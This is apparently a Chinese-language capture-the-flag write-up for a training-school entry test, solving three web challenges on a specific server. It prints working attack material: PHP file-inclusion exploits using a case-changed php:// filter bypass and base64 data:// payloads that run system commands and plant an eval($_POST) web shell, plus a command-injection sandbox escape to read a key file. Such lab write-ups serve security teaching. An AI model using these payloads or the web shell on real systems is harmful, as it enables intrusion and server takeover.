搞了个谷安学院的报名测试题目

![20201208142555](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201208142555.png)

## http://103.66.216.83:9997
变换提交方式，更改header为post 表单提交数据。

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>POST&GET</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />

</head>
<body>

<h1>请以get方式提交a=1 post方式提交b=2给服务器</h1>
key1:T0kS7r3c

</body>
</html>

## http://103.66.216.83:9998/?page=/flag

<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
//while (strstr($page, "php://")) {
//    $page=str_replace("php://", "", $page);
//}
include($page);
?>
flag{38469ca0ef5b847cc4247f41ff7f9e82}
这里有多种方式执行命令
### 过滤了`php://`的方式，使用大小写绕过过滤，使用PHP://协议恶意传输数据

### data://伪协议执行命令利用
php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码

使用方法:data://text/plain;base64,xxxx(base64编码后的数据)
<?php system("ls /")?> base64编码后使用PD9waHAgc3lzdGVtKCJscyAvIik/Pg==
http://103.66.216.83:9998/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=

### 使用data协议传木马
<?php eval($_POST[aaa]); ?>
PD9waHAgZXZhbCgkX1BPU1RbYWFhXSk7ID8+
http://103.66.216.83:9998/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbYWFhXSk7ID8+
菜刀直接连接

## http://103.66.216.83:9999
```
0 <?php
    header("Content-type:text/html;charset=utf-8"); 
    /*
    Hint:
    get the shell find the key；）\n";
    */
    $sandbox = '/var/www/html/sandbox/' . md5("M0rk" . $_SERVER['REMOTE_ADDR']);
    mkdir($sandbox,0777,true);
    chdir($sandbox);
    echo strlen($_GET['cmd']);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 30) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
echo "<br /> IP : {$_SERVER['REMOTE_ADDR']}";

IP : 223.104.105.184
```

http://103.66.216.83:9999/?cmd=cat%20../../key.php%20%3E../1

http://103.66.216.83:9999/sandbox/1
<?php
#key3:Welc0Me From GooAnn

看到这个大佬说不要去沙箱，可以跳出沙箱文件如
ls ../ >../23.txt
http://103.66.216.83:9999/?cmd=ls%20../%20%3E../23.txt
![20201208145152](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201208145152.png)

看到刚才创建的文件，再将沙箱文件外面的文件写入到23中
ls ../../ >../23.txt
![20201208145330](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201208145330.png)
看到有个key.php 讲php文件输送到23.txt中
查看文件得到key

## 参考连接

https://blog.csdn.net/a3320315/article/details/101635461
https://blog.csdn.net/weixin_43818995/article/details/104164700?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control

https://www.jianshu.com/p/955bae08f5e1
https://www.o2oxy.cn/1403.html?replytocom=315